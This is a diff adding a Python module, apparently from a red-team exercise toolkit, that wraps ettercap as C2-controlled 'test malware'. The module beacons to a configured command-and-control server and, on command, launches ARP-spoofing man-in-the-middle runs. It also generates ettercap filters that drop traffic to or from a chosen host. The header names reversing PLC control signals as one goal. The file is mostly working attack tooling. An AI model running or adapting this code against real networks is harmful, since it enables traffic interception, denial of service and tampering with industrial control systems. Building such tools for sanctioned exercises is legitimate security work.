@@ -1,0 +1,190 @@
+#-----------------------------------------------------------------------------
+# Name:        ettercapWrapper.py
+#
+# Purpose:     This ettercap wrapper is used to let the red team attacker can 
+#              apply different kinds of packet filter, packet data check and 
+#              placement function on the network traffic via using ettercap's 
+#              ARP spoofing function on the router/switch to launch the packet 
+#              drop, traffic block or even man in the middle attack.
+#
+# Author:      Yuancheng Liu
+#
+# Version:     v_0.1.2
+# Created:     2024/01/09
+# Copyright:   Copyright (c) 2023 LiuYuancheng
+# License:     MIT License
+#-----------------------------------------------------------------------------
+""" Program design: 
+    We want to implement two ARP spoofing attack 
+    - specific traffic packet drop.
+    - man in the middle to reverse the PLC control signal. 
+    for XS2023 which can be linked in our 
+    C2 emulation system (https://github.com/LiuYuancheng/Python_Malwares_Repo/tree/main/src/c2Emulator)
+    This program will be used in the testRun attack verfication demo of the 
+    cyber event : Cross Sword 2023
+"""
+
+import os
+import json
+import time
+from datetime import datetime
+
+import ConfigLoader
+import c2MwUtils
+
+CONFIG_FILE_NAME = 'ettercapWrapperCfg.txt'
+
+print("Current working directory is : %s" % os.getcwd())
+dirpath = os.path.dirname(__file__)
+print("Current source code location : %s" % dirpath)
+
+# Init the config loader program.
+gGonfigPath = os.path.join(dirpath, CONFIG_FILE_NAME)
+iConfigLoader = ConfigLoader.ConfigLoader(gGonfigPath, mode='r')
+if iConfigLoader is None:
+    print("Error: The config file %s is not exist.Program exit!" %str(gGonfigPath))
+    exit()
+CONFIG_DICT = iConfigLoader.getJson()
+
+#-----------------------------------------------------------------------------
+#-----------------------------------------------------------------------------
+class ettercapWrapper(c2MwUtils.c2TestMalware):
+
+    def __init__(self, malwareID, ownIp, c2Ipaddr, \
+                 c2port=5000, reportInt=10, tasksList=None, c2HttpsFlg=False, cmdTDFlg=True) -> None:
+        """ Init example:   client = ettercapWrapper(malwareID, ownIP, c2Ipaddr, 
+                              c2port=c2Port, reportInt=c2RptInv, tasksList=taskList, c2HttpsFlg=c2HttpsFlg)
+        Args:
+            malwareID (str): malware id
+            ownIp (str): malware ip address
+            c2Ipaddr (str): c2 server IP address
+            reportInt (int, optional): time interval between 2 report to c2. Defaults to 10 sec.
+            tasksList (list of dict, optional): refer to <programRcd> taskList. Defaults to None.
+            c2HttpsFlg (bool, optional): flag to identify whether connect to c2 via https. Defaults to False.
+            cmdTDFlg (bool, optional): flag to identify whether run the command execution task 
+                in the command runner's sub-thread. Defaults to False.
+        """
+        super().__init__(malwareID, ownIp, c2Ipaddr, c2port=c2port, reportInt=reportInt, \
+                         tasksList=tasksList, c2HttpsFlg=c2HttpsFlg, cmdTDFlg=cmdTDFlg)
+        print("Ettercap wrapper init finished.")
+
+    #-----------------------------------------------------------------------------
+    def _initActionHandlers(self):
+        """ Check whether the ettercap is installed and load all the ettercap 
+            filter information.
+        """
+        if not CONFIG_DICT['TEST_MD']:
+            cmdStr = "dpkg -l ettercap"
+            rst = self.cmdRunner.runCmd(cmdStr, detailFlg=False)
+            if rst == 'success':
+                print("The Ettercap has been installed.")
+            else:
+                print("Error : The tool Ettercap is not installed! Wrapper program exist...")
+                exit()
+        # Init the PLC connector 
+        filterCfgPath = os.path.join(dirpath, CONFIG_DICT['FILTER_RCD'])
+        self.filterDir = os.path.join(dirpath, CONFIG_DICT['FILTER_DIR'])
+        self.filterDict = dict()
+        if os.path.exists(filterCfgPath):
+            try:
+                with open(filterCfgPath) as fh:
+                    self.filterDict = json.load(fh)
+                return True
+            except Exception as err:
+                print("Error: open paramter config file error: %s" %str(err))
+                return None
+
+    #-----------------------------------------------------------------------------
+    def _handleSpecialTask(self, taskDict):
+        resultStr = 'taskTypeNotFound'
+        if taskDict['taskType'] == 'ettercapFilter':
+            resultStr = self.runPktFilter(taskDict['taskData'])
+        return resultStr
+
+    #-----------------------------------------------------------------------------
+    def runPktFilter(self, fileterCfgStr):
+        """ Use the command running to execute the ettercap in sub thread and apply 
+            the related fileter on it.
+            fileterCfgStr: 
+            formate 1: <filetername> : use the default local filter json config.
+            formate 2: <filetername>;<target ip>: use the user assigned config.
+        """
+        filterName, targetIp = fileterCfgStr.split(';') if ';' in fileterCfgStr else (fileterCfgStr, None)
+        print("Start to run the filter in background.")
+        if filterName in self.filterDict.keys():
+            filterInfo = self.filterDict[filterName]
+            filterFileName = filterInfo['filterFile']
+            if targetIp is None: targetIp = filterInfo['ipaddress']
+            filterFilePath = os.path.join(self.filterDir, filterFileName)
+            if os.path.exists(filterFilePath):
+                ettercapCmd = """ettercap -T -q -F %s -M ARP /%s//""" %(filterFileName, targetIp)
+                print("Run ettercap cmd: %s" %ettercapCmd)
+                self.cmdRunner.runCmdParallel(ettercapCmd)
+                rstStr = "Apply fileter %s on arget %s" %(filterFileName, targetIp)
+                print(rstStr)
+                return rstStr
+                
+            else:
+                rstStr= "WARN: Filter file is not exist."
+                print(rstStr)
+                return rstStr
+        else:
+            rstStr= "WARN: Filter ID is not in the filter record."
+            print(rstStr)
+            return rstStr
+
+#-----------------------------------------------------------------------------
+#-----------------------------------------------------------------------------
+def buildtoTgtDropperCode(ipaddress, port, protocal='TCP'):
+    ipaddr = str(ipaddress)
+    port = str(port)
+    protocal = str(protocal)
+    content = """
+    if (ip.proto == %s && tcp.dst == %s && ip.dst == '%s') {
+        # block the traffic send to the destination.
+        drop();
+        msg("Drop the packet to the target.\\n");
+    }""" % (protocal, port, ipaddr)
+    return content
+
+#-----------------------------------------------------------------------------
+def buildFromTgtDropperCode(ipaddress, port, protocal='TCP'):
+    ipaddr = str(ipaddress)
+    port = str(port)
+    protocal = str(protocal)
+    content = """
+    if (ip.proto == %s && tcp.dst == %s && ip.src == '%s') {
+        # block the traffic send from the destination.
+        drop();
+        msg("Drop the packet to the target.\\n");
+    }""" % (protocal, port, ipaddr)
+    return content
+
+#-----------------------------------------------------------------------------
+def main():
+    malwareID = CONFIG_DICT['OWN_ID']
+    ownIP = CONFIG_DICT['OWN_IP']
+    c2Ipaddr = CONFIG_DICT['C2_IP']
+    c2Port = int(CONFIG_DICT['C2_PORT'])
+    c2RptInv = int(CONFIG_DICT['C2_RPT_INV'])
+    c2HttpsFlg = CONFIG_DICT['C2_HTTPS'] if 'C2_HTTPS' in CONFIG_DICT else False
+    taskList = [
+            {
+                'taskID': 0,
+                'taskType': 'register',
+                'StartT': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                'repeat': 1,
+                'ExPerT': 0,
+                'state' : c2MwUtils.TASK_R_FLG,
+                'taskData': None
+            } ]
+    client = ettercapWrapper(malwareID, ownIP, c2Ipaddr, 
+                              c2port=c2Port, reportInt=c2RptInv, tasksList=taskList, c2HttpsFlg=c2HttpsFlg)
+    time.sleep(1)
+    client.run()
+    client.stop()
+
+#-----------------------------------------------------------------------------
+#-----------------------------------------------------------------------------
+if __name__ == '__main__':
+    main()
